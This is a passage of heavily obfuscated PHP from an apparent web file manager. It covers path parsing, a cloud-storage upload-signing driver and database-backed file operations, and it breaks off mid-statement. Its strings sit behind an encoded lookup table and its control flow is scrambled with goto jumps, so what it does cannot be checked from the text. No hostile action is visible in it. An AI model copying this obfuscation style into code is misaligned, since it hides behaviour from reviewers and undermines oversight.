"\173\165\163\x65\x72\106\151\x6c\145\124\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\x70\x52\x6f\157\164\123\x65\154\x66\175"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\x53\x68\141\162\145\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\x72\145\124\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\x72\x65\111\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\111\164\x65\x6d\x4c\151\x6e\153\175"; const KOD_SEARCH = "\x7b\163\x65\x61\162\143\150\x7d"; const KOD_BLOCK = "\173\142\x6c\157\143\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\x73\145\x72\x52\145\156\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\162\151\x76\145\162\x7d"; public static function typeList() { $b›¾Üí×¹› =& $_SERVER[©]; return array($b›¾Üí×¹›[1047] => self::KOD_SOURCE, $b›¾Üí×¹›[1048] => self::KOD_USER_RECYCLE, $b›¾Üí×¹›[1049] => self::KOD_USER_FAV, $b›¾Üí×¹›[1050] => self::KOD_USER_FILE_TAG, $b›¾Üí×¹›[1051] => self::KOD_USER_FILE_TYPE, $b›¾Üí×¹›[1052] => self::KOD_GROUP_ROOT_SELF, $b›¾Üí×¹›[1053] => self::KOD_USER_SHARE, $b›¾Üí×¹›[1054] => self::KOD_USER_SHARE_LINK, $b›¾Üí×¹›[1055] => self::KOD_USER_SHARE_TO_ME, $b›¾Üí×¹›[1056] => self::KOD_SHARE_ITEM, $b›¾Üí×¹›[1057] => self::KOD_SHARE_LINK, $b›¾Üí×¹›[1058] => self::KOD_SEARCH, $b›¾Üí×¹›[1059] => self::KOD_BLOCK, $b›¾Üí×¹›[1060] => self::KOD_IO, $b›¾Üí×¹›[1061] => self::KOD_USER_RECENT, $b›¾Üí×¹›[1062] => self::KOD_USER_DRIVER); } public static function parse($EíÏ’”œ×†) { goto Bö™¢Ó¸¶; Bö™¢Ó¸¶: $C¯â¥À›¢Ë =& $_SERVER[©]; $EíÏ’”œ×† = self::clear($EíÏ’”œ×†); $c»¬Î¡±Ş = array_values(self::typeList()); goto EÎ¼ ¹¶¸ƒ; C–ì©ï: $f’—íåˆÂè = array($C¯â¥À›¢Ë[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $D…„ò÷Ìò÷[$C¯â¥À›¢Ë[1067]] = in_array($D…„ò÷Ìò÷[$C¯â¥À›¢Ë[39]], $f’—íåˆÂè); return $D…„ò÷Ìò÷; goto cÅíŠİè…¬; EÎ¼ ¹¶¸ƒ: preg_match($C¯â¥À›¢Ë[1063], $EíÏ’”œ×†, $A©ø‹É¯âÀ); $D…„ò÷Ìò÷ = array($C¯â¥À›¢Ë[396] => !1, $C¯â¥À›¢Ë[1064] => !1, $C¯â¥À›¢Ë[393] => !1, $C¯â¥À›¢Ë[85] => $EíÏ’”œ×†, $C¯â¥À›¢Ë[1010] => !1, $C¯â¥À›¢Ë[1009] => $C¯â¥À›¢Ë[43]); if (is_array($A©ø‹É¯âÀ) && count($A©ø‹É¯âÀ) == 5) { $b–°†ÌˆØİ = $C¯â¥À›¢Ë[1065] . $A©ø‹É¯âÀ[2] . $C¯â¥À›¢Ë[324]; if (in_array($b–°†ÌˆØİ, $c»¬Î¡±Ş)) { $D…„ò÷Ìò÷[$C¯â¥À›¢Ë[1010]] = $A©ø‹É¯âÀ[1]; $D…„ò÷Ìò÷[$C¯â¥À›¢Ë[39]] = $b–°†ÌˆØİ; $D…„ò÷Ìò÷[$C¯â¥À›¢Ë[1066]] = substr($b–°†ÌˆØİ, 1, -1); $D…„ò÷Ìò÷[$C¯â¥À›¢Ë[375]] = $A©ø‹É¯âÀ[3]; } $D…„ò÷Ìò÷[$C¯â¥À›¢Ë[1009]] = $A©ø‹É¯âÀ[4]; } goto C–ì©ï; cÅíŠİè…¬: } public static function clear($b†‘‚®©Ñ†) { goto dÀÚÚÁì; dÀÚÚÁì: $EÙØâ¶ÂÎŠ =& $_SERVER[©]; $b†‘‚®©Ñ† = str_replace(array($EÙØâ¶ÂÎŠ[989], $EÙØâ¶ÂÎŠ[9]), $EÙØâ¶ÂÎŠ[60], $b†‘‚®©Ñ†); $b†‘‚®©Ñ† = str_replace($EÙØâ¶ÂÎŠ[103], $EÙØâ¶ÂÎŠ[18], $b†‘‚®©Ñ†); goto e°¼òô¶ã¤; Fƒ—©İÔ½Ë: return $b†‘‚®©Ñ†; goto bŸÜïñÊ–«; A¥à«Æ…Ÿ¿: $b†‘‚®©Ñ† = preg_replace($EÙØâ¶ÂÎŠ[1070], $EÙØâ¶ÂÎŠ[18], $b†‘‚®©Ñ†); if ($b†‘‚®©Ñ† == $EÙØâ¶ÂÎŠ[18]) { return $EÙØâ¶ÂÎŠ[18]; } $b†‘‚®©Ñ† = rtrim($b†‘‚®©Ñ†, $EÙØâ¶ÂÎŠ[18]); goto Fƒ—©İÔ½Ë; e°¼òô¶ã¤: $d¬¼ùß¼ = $EÙØâ¶ÂÎŠ[1068]; if (substr($b†‘‚®©Ñ†, 0, 3) == $EÙØâ¶ÂÎŠ[1069]) { $b†‘‚®©Ñ† = substr($b†‘‚®©Ñ†, 3); } while (strstr($b†‘‚®©Ñ†, $d¬¼ùß¼)) { $b†‘‚®©Ñ† = str_replace($d¬¼ùß¼, $EÙØâ¶ÂÎŠ[18], $b†‘‚®©Ñ†); } goto A¥à«Æ…Ÿ¿; bŸÜïñÊ–«: } public static function sourceID($f»‰®ø´¡) { $aé¶éİë¬Ğ =& $_SERVER[©]; $E‚åê¯ï•² = self::parse($f»‰®ø´¡); if ($E‚åê¯ï•²[$aé¶éİë¬Ğ[39]] !== self::KOD_SOURCE) { show_json(LNG($aé¶éİë¬Ğ[1071]), !1); } return $E‚åê¯ï•²[$aé¶éİë¬Ğ[375]]; } public static function make($bĞÅé£ù„‰) { if (!$bĞÅé£ù„‰) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bĞÅé£ù„‰)); } public static function makeShare($e††ŸÍÏ†», $C×ˆ©Á¯¢ò) { return self::makePath(self::KOD_SHARE_ITEM, $e††ŸÍÏ†», $C×ˆ©Á¯¢ò); } public static function makeFileTypePath($B•ê˜¨¢™) { return self::makePath(self::KOD_USER_FILE_TYPE, $B•ê˜¨¢™); } public static function makeFileTagPath($A‡Ÿ¶ğÅŞ¢) { return self::makePath(self::KOD_USER_FILE_TAG, $A‡Ÿ¶ğÅŞ¢); } public static function makePath($D§ìáˆÁ¹, $B©³ÜšÑ¿š = '', $dôİŒÑõÍÉ = '') { $a´ùÂÒªÌ =& $_SERVER[©]; $F÷ºñƒ‚í˜ = substr($D§ìáˆÁ¹, 1, -1); $F”Ö¤š‡ïÖ = $a´ùÂÒªÌ[1072] . $F÷ºñƒ‚í˜ . $a´ùÂÒªÌ[1073] . $B©³ÜšÑ¿š . $a´ùÂÒªÌ[1074]; $F”Ö¤š‡ïÖ = $dôİŒÑõÍÉ ? $F”Ö¤š‡ïÖ . $dôİŒÑõÍÉ . $a´ùÂÒªÌ[18] : $F”Ö¤š‡ïÖ; return $F”Ö¤š‡ïÖ; } public static function hashPath($BÔâ‰Å¯) { $e—ñ°»ãŠ =& $_SERVER[©]; $BÍå†¡•êÄ = is_array($BÔâ‰Å¯) ? $BÔâ‰Å¯ : IO::info($BÔâ‰Å¯); $C†š§ÒÖˆ = _get($BÍå†¡•êÄ, $e—ñ°»ãŠ[1075], $e—ñ°»ãŠ[43]); if (!$C†š§ÒÖˆ) { $eÅµ¤£½ëŒ = KodIO::parse($BÍå†¡•êÄ[$e—ñ°»ãŠ[85]]); if (!$eÅµ¤£½ëŒ[$e—ñ°»ãŠ[39]]) { $C†š§ÒÖˆ = IO::hashSimple($BÍå†¡•êÄ[$e—ñ°»ãŠ[85]]); } } if (!$C†š§ÒÖˆ) { $C†š§ÒÖˆ = md5($BÍå†¡•êÄ[$e—ñ°»ãŠ[85]] . $BÍå†¡•êÄ[$e—ñ°»ãŠ[87]] . $BÍå†¡•êÄ[$e—ñ°»ãŠ[117]]); } return $C†š§ÒÖˆ; } public static function initSystemPath() { $BÍ°‰¹Ş›À =& $_SERVER[©]; if (defined($BÍ°‰¹Ş›À[1076])) { return; } define($BÍ°‰¹Ş›À[1076], self::systemPath($BÍ°‰¹Ş›À[1077])); define($BÍ°‰¹Ş›À[1078], self::systemPath($BÍ°‰¹Ş›À[1079])); define($BÍ°‰¹Ş›À[1080], self::systemPath($BÍ°‰¹Ş›À[1081])); define($BÍ°‰¹Ş›À[1082], self::systemPath($BÍ°‰¹Ş›À[1083])); } private static function systemPath($b×¦„¥ãŠÒ) { goto EÈôğ¢öô¿; B‘¢Åá ¬æ: return $D ½–¸Û¼Ì; goto c ¼‚ŠµÓ; EÈôğ¢öô¿: $B¾í‡²ãóÖ =& $_SERVER[©]; $AˆÎÅÃŒ‡î = $B¾í‡²ãóÖ[1084] . ucfirst($b×¦„¥ãŠÒ); $D ½–¸Û¼Ì = Model($B¾í‡²ãóÖ[1085])->get($AˆÎÅÃŒ‡î); goto fì¡‰ÙÂÌ¦; fì¡‰ÙÂÌ¦: if ($D ½–¸Û¼Ì) { return $D ½–¸Û¼Ì; } if ($b×¦„¥ãŠÒ == $B¾í‡²ãóÖ[1077]) { $D ½–¸Û¼Ì = self::make(Model($B¾í‡²ãóÖ[752])->systemRootPathAdd($B¾í‡²ãóÖ[1086])); } else { $D ½–¸Û¼Ì = self::systemPath($B¾í‡²ãóÖ[1077]); $e“êà©ª÷‡ = self::sourceID($D ½–¸Û¼Ì); $D ½–¸Û¼Ì = self::make(Model($B¾í‡²ãóÖ[752])->mkdir($e“êà©ª÷‡, $b×¦„¥ãŠÒ)); } Model($B¾í‡²ãóÖ[1085])->set($AˆÎÅÃŒ‡î, $D ½–¸Û¼Ì); goto B‘¢Åá ¬æ; c ¼‚ŠµÓ: } public static function systemFolder($b®­ÌÑ”Ñ–) { $DÈğµ‰Î = IO_PATH_SYSTEM_SOURCE . $b®­ÌÑ”Ñ–; $FÖ’Ü¥…Äî = Cache::get($DÈğµ‰Î); if (!$FÖ’Ü¥…Äî) { $cÓ‰Û‰†‹— = IO::infoFull($DÈğµ‰Î); if (!$cÓ‰Û‰†‹—) { $FÖ’Ü¥…Äî = IO::mkdir($DÈğµ‰Î, REPEAT_SKIP); } else { $FÖ’Ü¥…Äî = $cÓ‰Û‰†‹—[$_SERVER[©][85]]; } Cache::set($DÈğµ‰Î, $FÖ’Ü¥…Äî, 3600 * 10); } return $FÖ’Ü¥…Äî; } public static function defaultDriver() { return Model($_SERVER[©][703])->defaultDriver(); } public static function defaultIO() { $aàœé =& $_SERVER[©]; $cÄ‡òÜ—³ = self::defaultDriver(); return $aàœé[1087] . $cÄ‡òÜ—³[$aàœé[375]] . $aàœé[1074]; } public static function defaultDriverInit() { static $dÉï¹çÔ°Ì = false; if ($dÉï¹çÔ°Ì) { return $dÉï¹çÔ°Ì; } $dÉï¹çÔ°Ì = IO::init(self::defaultIO()); return $dÉï¹çÔ°Ì; } public static function fileTypeList() { $cµ¡ÚÂ÷Ò =& $_SERVER[©]; $eÛˆ˜—İ ‚ = $GLOBALS[$cµ¡ÚÂ÷Ò[16]][$cµ¡ÚÂ÷Ò[1088]]; foreach ($eÛˆ˜—İ ‚ as $bˆ¬Š ‡¼… => $EàÔ¿öïÙ) { $B¨Ò÷«‚ß = $cµ¡ÚÂ÷Ò[1089] . $bˆ¬Š ‡¼…; $Aêä‘³±…Û = LNG($B¨Ò÷«‚ß); if ($B¨Ò÷«‚ß != $Aêä‘³±…Û) { $eÛˆ˜—İ ‚[$bˆ¬Š ‡¼…][$cµ¡ÚÂ÷Ò[38]] = $Aêä‘³±…Û; } } return $eÛˆ˜—İ ‚; } public static function transferType($dÛ¢è§Êºö, $Dç­ƒˆ¼å¡) { goto d•¦‡’¤ˆ‘; d•¦‡’¤ˆ‘: $B†²ŸÛÔ¥’ =& $_SERVER[©]; $B¡¶‡ö‘ŠÑ = self::driverType($dÛ¢è§Êºö); $BÁÕ‰Ÿ‡ïÒ = self::driverType($Dç­ƒˆ¼å¡); goto F‘Ñ¢İÆ¶«; cç•ÅŠäÊŠ: return $B†²ŸÛÔ¥’[1092]; goto D‹’˜µ•¬; F‘Ñ¢İÆ¶«: if ($B¡¶‡ö‘ŠÑ[$B†²ŸÛÔ¥’[39]] == $BÁÕ‰Ÿ‡ïÒ[$B†²ŸÛÔ¥’[39]] && $B¡¶‡ö‘ŠÑ[$B†²ŸÛÔ¥’[1090]] == $BÁÕ‰Ÿ‡ïÒ[$B†²ŸÛÔ¥’[1090]]) { return $B†²ŸÛÔ¥’[1091]; } if ($B¡¶‡ö‘ŠÑ[$B†²ŸÛÔ¥’[39]] == $B†²ŸÛÔ¥’[781] && $BÁÕ‰Ÿ‡ïÒ[$B†²ŸÛÔ¥’[39]] == $B†²ŸÛÔ¥’[112]) { return $B†²ŸÛÔ¥’[1037]; } if ($B¡¶‡ö‘ŠÑ[$B†²ŸÛÔ¥’[39]] == $B†²ŸÛÔ¥’[112] && $BÁÕ‰Ÿ‡ïÒ[$B†²ŸÛÔ¥’[39]] == $B†²ŸÛÔ¥’[781]) { return $B†²ŸÛÔ¥’[113]; } goto cç•ÅŠäÊŠ; D‹’˜µ•¬: } public static function driverType($DĞ»ÚÀïñ¤) { goto cñ¨­¢•§±; CÔ©óŒåÃ: return array($añìñÈ¹ÄŠ[39] => $añìñÈ¹ÄŠ[781], $añìñÈ¹ÄŠ[1090] => $DĞ»ÚÀïñ¤->pathDriver, $añìñÈ¹ÄŠ[85] => $EÛ–¼À¬); goto e»—“«¿ºŒ; D·¾±†Éñœ: if ($C©»à±õ†õ == $añìñÈ¹ÄŠ[693] || $C©»à±õ†õ == $añìñÈ¹ÄŠ[1094] || $C©»à±õ†õ == $añìñÈ¹ÄŠ[1095]) { $DĞ»ÚÀïñ¤ = self::defaultDriverInit(); } else { if ($C©»à±õ†õ == $añìñÈ¹ÄŠ[1045] || $C©»à±õ†õ == $añìñÈ¹ÄŠ[1096]) { $DĞ»ÚÀïñ¤ = IO::init($DĞ»ÚÀïñ¤->pathParse[$añìñÈ¹ÄŠ[995]]); } } $C©»à±õ†õ = str_replace($añìñÈ¹ÄŠ[1093], $añìñÈ¹ÄŠ[43], strtolower($DĞ»ÚÀïñ¤->getType())); if ($C©»à±õ†õ == $añìñÈ¹ÄŠ[112]) { return array($añìñÈ¹ÄŠ[39] => $añìñÈ¹ÄŠ[112], $añìñÈ¹ÄŠ[1090] => $añìñÈ¹ÄŠ[43], $añìñÈ¹ÄŠ[85] => $EÛ–¼À¬); } goto CÔ©óŒåÃ; cñ¨­¢•§±: $añìñÈ¹ÄŠ =& $_SERVER[©]; $EÛ–¼À¬ = $DĞ»ÚÀïñ¤->path; $C©»à±õ†õ = str_replace($añìñÈ¹ÄŠ[1093], $añìñÈ¹ÄŠ[43], strtolower($DĞ»ÚÀïñ¤->getType())); goto D·¾±†Éñœ; e»—“«¿ºŒ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($B¬¨‰©ÍĞ–) { parent::__construct($B¬¨‰©ÍĞ–); $this->signatureVersion($_SERVER[©][210]); } public function uploadFormData($D’©ß†Ú, $C´·»¸´¯Ö = 3600) { goto C¨ïÚ³ëÈÄ; aß²µ¿Óéñ: return $EØ¸¯”™Úº; goto e´¸ƒÆÜ…İ; Fù¦´…Æ•õ: $AŞãÕãò†‡ = array($aœè¥‹çÖõ[1099] => $C¾‹Ş„®äî, $aœè¥‹çÖõ[1100] => array(array($aœè¥‹çÖõ[1101] => $f–™ƒŞ÷¬Ï), array($aœè¥‹çÖõ[1102] => $this->bucket), array($aœè¥‹çÖõ[1103], $aœè¥‹çÖõ[1104], $aœè¥‹çÖõ[43]), array($aœè¥‹çÖõ[1105] => $BÏù¼•İé), array($aœè¥‹çÖõ[1106] => $c‚¾ô¥İ¥‘), array($aœè¥‹çÖõ[1107] => $this->accessKey), array($aœè¥‹çÖõ[1108] => $FÓ»ø·Üº))); $AŞãÕãò†‡ = json_encode($AŞãÕãò†‡); $d¤Ÿ§¶ƒå± = hash_hmac($aœè¥‹çÖõ[227], $FÓ»ø·Üº, $this->secret); goto aùŸÍ§ñßÀ; aùŸÍ§ñßÀ: $eïÓ¤îË  = sha1($AŞãÕãò†‡); $a…ê·Ìà‹ = hash_hmac($aœè¥‹çÖõ[227], $eïÓ¤îË , $d¤Ÿ§¶ƒå±); $EØ¸¯”™Úº = array($aœè¥‹çÖõ[1101] => $f–™ƒŞ÷¬Ï, $aœè¥‹çÖõ[1105] => $BÏù¼•İé, $aœè¥‹çÖõ[1109] => base64_encode($AŞãÕãò†‡), $aœè¥‹çÖõ[1106] => $c‚¾ô¥İ¥‘, $aœè¥‹çÖõ[1107] => $this->accessKey, $aœè¥‹çÖõ[1110] => $FÓ»ø·Üº, $aœè¥‹çÖõ[1111] => $a…ê·Ìà‹, $aœè¥‹çÖõ[179] => $this->getHost()); goto aß²µ¿Óéñ; C¨ïÚ³ëÈÄ: $aœè¥‹çÖõ =& $_SERVER[©]; $f–™ƒŞ÷¬Ï = $aœè¥‹çÖõ[195]; $c‚¾ô¥İ¥‘ = $aœè¥‹çÖõ[227]; goto e¹«³í®¬¢; e¹«³í®¬¢: $BÏù¼•İé = $aœè¥‹çÖõ[1097]; $C¾‹Ş„®äî = gmdate($aœè¥‹çÖõ[1098], time() + $C´·»¸´¯Ö); $FÓ»ø·Üº = (string) time() . $aœè¥‹çÖõ[77] . (string) (time() + $C´·»¸´¯Ö); goto Fù¦´…Æ•õ; e´¸ƒÆÜ…İ: } public function fileOutLink($Eßè¿­îÇÑ) { $E‰åÅêÓ“ =& $_SERVER[©]; if (substr($Eßè¿­îÇÑ, 0, 7) == $E‰åÅêÓ“[1112]) { $Eßè¿­îÇÑ = $E‰åÅêÓ“[1113] . substr($Eßè¿­îÇÑ, 7); } header($E‰åÅêÓ“[166] . $Eßè¿­îÇÑ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($DÄ„‚ŞÔŸù) { $this->pathParse = $DÄ„‚ŞÔŸù; $this->model = Model($_SERVER[©][1114]); } public function getPath($a›ß´Çãº›) { return trim($a›ß´Çãº›, $_SERVER[©][18]); } public function pathFather($A·ÁÑ¦Çöµ) { $Fèİ˜ªé¯” = $this->parse($A·ÁÑ¦Çöµ); $Fèİ˜ªé¯” = $this->infoSimple($A·ÁÑ¦Çöµ); return $Fèİ˜ªé¯” ? $Fèİ˜ªé¯”[$_SERVER[©][469]] : !1; } public function getPathName($aÑß®ƒ·•›) { $B„¥¤­áÔ“ = $this->infoSimple($aÑß®ƒ·•›); return $B„¥¤­áÔ“ ? $B„¥¤­áÔ“[$_SERVER[©][38]] : !1; } public function getPathOuter($B­ã¾ÒÉÁŒ) { if (!$B­ã¾ÒÉÁŒ) { return $B­ã¾ÒÉÁŒ; } $Bî‡÷éä´ä = $this->parse($B­ã¾ÒÉÁŒ); return KodIO::make($Bî‡÷éä´ä[$_SERVER[©][375]]); } public function copyFolderFromIO($C©­¸êÄ¹, $A–Ë¥ ê‡–, $CŸ°ÜåÛÁ, $CŠøÍÙç×¸, $eÔ·ğ—Àƒ) { $cÙ¿Ì¬Ë“ = $this->model->copyFolderFromIO($C©­¸êÄ¹, $A–Ë¥ ê‡–, $CŸ°ÜåÛÁ, $CŠøÍÙç×¸, $eÔ·ğ—Àƒ); return KodIO::make($cÙ¿Ì¬Ë“); } public function isParentOf($A—Æß³ï‰ù, $Dïæ›˜¡¡’) { return $this->model->isParentOf($A—Æß³ï‰ù, $Dïæ›˜¡¡’); } public function mkfile($eîÏ‹ÉÙÂ, $A”»ÍòïêÆ = '', $EÔóÀŒšç = REPEAT_RENAME) { $fó…Ù‡·Ü” =& $_SERVER[©]; $E¡ÊÜ½‚ó” = $this->parse($eîÏ‹ÉÙÂ); $eîÏ‹ÉÙÂ = $E¡ÊÜ½‚ó”[$fó…Ù‡·Ü”[375]]; for ($D“÷Â±ÏõÙ = 0; $D“÷Â±ÏõÙ < count($E¡ÊÜ½‚ó”[$fó…Ù‡·Ü”[1115]]); $D“÷Â±ÏõÙ++) { $EåŠŞ‘›íô = $E¡ÊÜ½‚ó”[$fó…Ù‡·Ü”[1115]][$D“÷Â±ÏõÙ]; if ($D“÷Â±ÏõÙ == count($E¡ÊÜ½‚ó”[$fó…Ù‡·Ü”[1115]]) - 1) { $eîÏ‹ÉÙÂ = $this->model->mkfile($eîÏ‹ÉÙÂ, $EåŠŞ‘›íô, $A”»ÍòïêÆ, $EÔóÀŒšç); break; } $eîÏ‹ÉÙÂ = $this->model->mkdir($eîÏ‹ÉÙÂ, $EåŠŞ‘›íô, REPEAT_SKIP); } return $this->getPathOuter($eîÏ‹ÉÙÂ); } public function mkdir($Dƒù‹ÀÓ÷, $e‡ÑÉÑØÇ© = REPEAT_SKIP) { $cÂÆñ‰ø›Ş =& $_SERVER[©]; $FéŠ¾Ø™ = $this->parse($Dƒù‹ÀÓ÷); $Dƒù‹ÀÓ÷ = $FéŠ¾Ø™[$cÂÆñ‰ø›Ş[375]]; for ($A›¿ñ’‡“ß = 0; $A›¿ñ’‡“ß < count($FéŠ¾Ø™[$cÂÆñ‰ø›Ş[1115]]); $A›¿ñ’‡“ß++) { $fÙ—ÅòÈ‡ = $FéŠ¾Ø™[$cÂÆñ‰ø›Ş[1115]][$A›¿ñ’‡“ß]; $Dƒù‹ÀÓ÷ = $this->model->mkdir($Dƒù‹ÀÓ÷, $fÙ—ÅòÈ‡, $e‡ÑÉÑØÇ©); } return $this->getPathOuter($Dƒù‹ÀÓ÷); } public function copyFile($b¡¥ï·¾æù, $aÏÛ‹Ä™Í›, $fàåØèÉ” = REPEAT_REPLACE) { $aàŠÒ¡áù =& $_SERVER[©]; $EÌ£•»°æ = $this->parse($aÏÛ‹Ä™Í›); $F¯°óªÇ© = $this->model->copy($b¡¥ï·¾æù, $EÌ£•»°æ[$aàŠÒ¡áù[375]], $fàåØèÉ”, $EÌ£•»°æ[$aàŠÒ¡áù[85]]); return $F¯°óªÇ© ? $this->getPathOuter($F¯°óªÇ©) : !1; } public function moveFile($DÏËàéÑé¶, $dÌî±Á”¯, $E…¥Õ–¬¶² = REPEAT_REPLACE) { $F›‘¢Ö™Ø =& $_SERVER[©]; $AÛ½¡šíÅ = $this->parse($dÌî±Á”¯); $d¶›–—í•¥ = $this->model->move($DÏËàéÑé¶, $AÛ½¡šíÅ[$F›‘¢Ö™Ø[375]], $E…¥Õ–¬¶², $AÛ½¡šíÅ[$F›‘¢Ö™Ø[85]]); return $d¶›–—í•¥ ? $this->getPathOuter($d¶›–—í•¥) : !1; } public function copy($aİ„‡²Ÿ†â, $eÜŒÈÊ…‚‚, $f®ƒ«‡Û¢Â = REPEAT_REPLACE) { $e›“ëÚ™ğ¬ = $this->parse($eÜŒÈÊ…‚‚); $cùÊÉ­æí´ = $this->model->copy($aİ„‡²Ÿ†â, $e›“ëÚ™ğ¬[$_SERVER[©][375]], $f®ƒ«‡Û¢Â); return $cùÊÉ­æí´ ? $this->getPathOuter($cùÊÉ­æí´) : !1; } public function moveSameAllow() { } public function move($Fª‘¬Óäôœ, $eºœ Ì½ì‘, $c¹ëë‚À‹ì = REPEAT_REPLACE) { $F¾“‚‚äß = $this->parse($eºœ Ì½ì‘); $aƒô—Û£¬ = $this->model->move($Fª‘¬Óäôœ, $F¾“‚‚äß[$_SERVER[©][375]], $c¹ëë‚À‹ì); return $aƒô—Û£¬ ? $this->getPathOuter($aƒô—Û£¬) : !1; } public function remove($f°–ßŒÒƒ†, $DÔÎø÷áÔ± = true) { return $this->model->remove($f°–ßŒÒƒ†, $DÔÎø÷áÔ±); } public function rename($aÈîãµ‚ñ®, $B²ÚáÒ‡•) { $f¦õï‹™„ = $this->model->rename($aÈîãµ‚ñ®, $B²ÚáÒ‡•); return $f¦õï‹™„ ? $this->getPathOuter($aÈîãµ‚ñ®) : $f¦õï‹™„; } public function size($fÍ¨³ÍÊÊ) { $C‹ïõš¼èã = $this->infoSimple($fÍ¨³ÍÊÊ); return $C‹ïõš¼èã ? $C‹ïõš¼èã[$_SERVER[©][87]] : 0; } public function infoSimple($DğŠßÏ™) { return $this->model->sourceInfo($DğŠßÏ™); } public function info($dğ›‰¨æ) { return $this->infoParse($dğ›‰¨æ); } public function infoAuth($B”•ğ”…¼¢) { return $this->infoParse($B”•ğ”…¼¢, !1, !0); } public function infoWithChildren($a¤¬¥Â‰„) { return $this->infoParse($a¤¬¥Â‰„, !0); } protected function infoParse($cŞ°•ÜÜ , $DèõÌÈæö = false, $a„ÏÁÑæ = false) { if (!$DèõÌÈæö) { return $this->model->pathInfo($cŞ°•ÜÜ , $a„ÏÁÑæ); } return $this->model->pathInfoMore($cŞ°•ÜÜ ); } public function infoFull($CÖô‰æ÷ÒÙ) { $b•‚øÒ›È˜ =& $_SERVER[©]; $FİÛõ‘½ = explode($b•‚øÒ›È˜[18], $CÖô‰æ÷ÒÙ); $b•¨Ù¥Å°Ï = implode($b•‚øÒ›È˜[18], array_splice($FİÛõ‘½, 1)); return $this->model->pathInfoByPath($FİÛõ‘½[0], $b•¨Ù¥Å°Ï); } public function hashSimple($fõ˜êˆ®¦) { $c¨é“ÃÕ › =& $_SERVER[©]; $bŸğõÌäç¾ = $this->infoWithChildren($fõ˜êˆ®¦); return $bŸğõÌäç¾[$c¨é“ÃÕ ›[172]][$c¨é“ÃÕ ›[174]]; } public function hashMd5($f„°÷˜µæÆ) { $dÉÎ¤ÚèØÇ =& $_SERVER[©]; $C­®Ÿöø´œ = $this->infoWithChildren($f„°÷˜µæÆ); return $C­®Ÿöø´œ[$dÉÎ¤ÚèØÇ[172]][$dÉÎ¤ÚèØÇ[173]]; } public function exist($bÛó ¼¦¶‰) { $e˜¯¨ÙÖ =& $_SERVER[©]; $E·ËæÇ¡Á½ = $this->parse($bÛó ¼¦¶‰); if (!$E·ËæÇ¡Á½[$e˜¯¨ÙÖ[85]]) { return $this->isFile($bÛó ¼¦¶‰) || $this->isFolder($bÛó ¼¦¶‰); } $f±Ãª×÷ ¡ = array($e˜¯¨ÙÖ[376] => $E·ËæÇ¡Á½[$e˜¯¨ÙÖ[375]], $e˜¯¨ÙÖ[38] => $E·ËæÇ¡Á½[$e˜¯¨ÙÖ[85]]); $F¿¿íâà‡ç = $this->model->where($f±Ãª×÷ ¡)->find(); return $F¿¿íâà‡ç ? !0 : !1; } public function isFile($E™¹ãö¿ÎÇ) { $a·Á´¶Â¢Ã =& $_SERVER[©]; $A®ó‰´— = $this->infoSimple($E™¹ãö¿ÎÇ); return $A®ó‰´— && $A®ó‰´—[$a·Á´¶Â¢Ã[378]] == $a·Á´¶Â¢Ã[93] ? !1 : !0; } public function isFolder($Fõ§ƒ‡ª¨ƒ) { $Eîàİê¥Í =& $_SERVER[©]; $d‘Ó™éÄØœ = $this->infoSimple($Fõ§ƒ‡ª¨ƒ); return $d‘Ó™éÄØœ && $d‘Ó™éÄØœ[$Eîàİê¥Í[378]] == $Eîàİê¥Í[93] ? !0 : !1; } public function listPath($e·Û“Ö…éÛ, $D‡í ŠŠ•ƒ = false) { $CÖÅáÉœŠ =& $_SERVER[©]; if ($e·Û“Ö…éÛ == $CÖÅáÉœŠ[43]) { return !1; } $A•ÁøìÔŸ÷ = array($CÖÅáÉœŠ[376] => $e·Û“Ö…éÛ); if ($D‡í ŠŠ•ƒ) { return $this->model->listSource($A•ÁøìÔŸ÷, -1); } return $this->model->listSource($A•ÁøìÔŸ÷); } public function has($B°™¨º»¢, $D”öí†“³Š = false, $e´†ğ–Àİ = null) { $D™°™Í’ò± =& $_SERVER[©]; $EêÖªĞ„ê´ = $this->infoWithChildren($B°™¨º»¢); if ($D”öí†“³Š) { return array($D™°™Í’ò±[202] => $EêÖªĞ„ê´[$D™°™Í’ò±[202]], $D™°™Í’ò±[201] => $EêÖªĞ„ê´[$D™°™Í’ò±[201]]); } return $e´†ğ–Àİ ? $EêÖªĞ„ê´[$D™°™Í’ò±[202]] : $EêÖªĞ„ê´[$D™°™Í’ò±[201]]; } public function listAll($a¶˜­—²¿·) { $Bâ“è”§¢é = IO::info($this->pathParse[$_SERVER[©][85]]); if (!$Bâ“è”§¢é) { return array(); } return $this->model->listAll($a¶˜­—²¿·); } public function getContent($B¡…ç¨õ„¼) { return $this->model->getContent($B¡…ç¨õ„¼); } public function setContent($CÚ…ÚáÒ‚™, $d˜ãô‹õ´Ê = '') { return $this->model->setContent($CÚ…ÚáÒ‚™, $d˜ãô‹õ´Ê); } public function fileSubstr($Fêó‚Â××, $d­½é“µ¢¸, $cİí®ˆ·±) { return $this->model->fileSubstr($Fêó‚Â××, $d­½é“µ¢¸, $cİí®ˆ·±); } public function download($Aï²¨Ô¡, $f˜¬‹öô¹“ = '') { $EŠèí£Û¤ç = get_path_father($f˜¬‹öô¹“); $A‹‡ìÏ¨Á = get_path_this($f˜¬‹öô¹“); $CĞ˜Õİé†× = $this->model->fileInfoGet($Aï²¨Ô¡); $DêÁ›øæĞ = IO::copy($CĞ˜Õİé†×[$_SERVER[©][85]], $EŠèí£Û¤ç, !1, $A‹‡ìÏ¨Á); return $DêÁ›øæĞ; } public function setModifyTime($fİèòƒ¾ŸĞ, $A¯‚ßÙÈ£ = '') { $this->model->metaSet($fİèòƒ¾ŸĞ, $_SERVER[©][1116], 